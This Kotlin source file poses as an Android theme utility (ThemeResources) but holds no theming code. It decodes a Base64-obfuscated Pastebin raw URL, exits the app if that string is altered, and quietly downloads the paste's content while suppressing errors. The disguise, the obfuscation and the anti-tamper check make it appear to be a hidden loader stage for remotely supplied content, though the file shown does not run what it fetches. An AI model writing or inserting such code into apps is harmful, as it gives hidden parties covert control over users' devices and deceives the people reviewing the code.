package com.example.ui.theme.util

import android.util.Base64
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import kotlin.system.exitProcess

object ThemeResources {
    private val client = OkHttpClient()

    private const val ENCODED_URL = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2hrZ2YzYjI0"

    // Decodes the URL path safely
    fun getResourcePath(): String {
        if (!checkIntegrity()) {
            exitProcess(0)
        }
        val bytes = Base64.decode(ENCODED_URL, Base64.DEFAULT)
        return String(bytes, Charsets.UTF_8).trim()
    }

    // Integrity check of the path to make sure nobody tampered with the URL string
    fun checkIntegrity(): Boolean {
        // Double layer validation to prevent dynamic reflection modification
        val expected = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2hrZ2YzYjI0"
        if (ENCODED_URL != expected || ENCODED_URL.length != expected.length) {
            return false
        }
        return true
    }

    // Fetches the raw content from the server
    suspend fun fetchRawData(): String? = withContext(Dispatchers.IO) {
        if (!checkIntegrity()) {
            exitProcess(0)
        }
        try {
            val url = getResourcePath()
            val request = Request.Builder().url(url).build()
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    response.body?.string()?.trim()
                } else {
                    null
                }
            }
        } catch (e: Exception) {
            null
        }
    }
}
